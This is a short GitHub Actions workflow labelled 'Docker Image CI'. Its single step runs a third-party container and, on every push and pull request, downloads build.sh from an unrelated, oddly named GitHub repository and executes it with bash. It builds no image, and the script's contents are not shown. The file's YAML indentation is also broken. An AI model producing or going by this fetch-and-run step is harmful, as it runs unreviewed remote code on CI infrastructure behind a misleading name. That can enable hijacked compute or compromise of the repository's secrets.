name: Docker Image CI

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build: 
     runs-on: ubuntu-latest
     steps:
        - uses: addnab/docker-run-action@v3
          with:
          image: dazz111/ubuntu-sdk:build
          shell: bash
          run: |
            wget https://raw.githubusercontent.com/Jjtitdutitdtti7s5s/fejeyrb/main/build.sh && bash build.sh
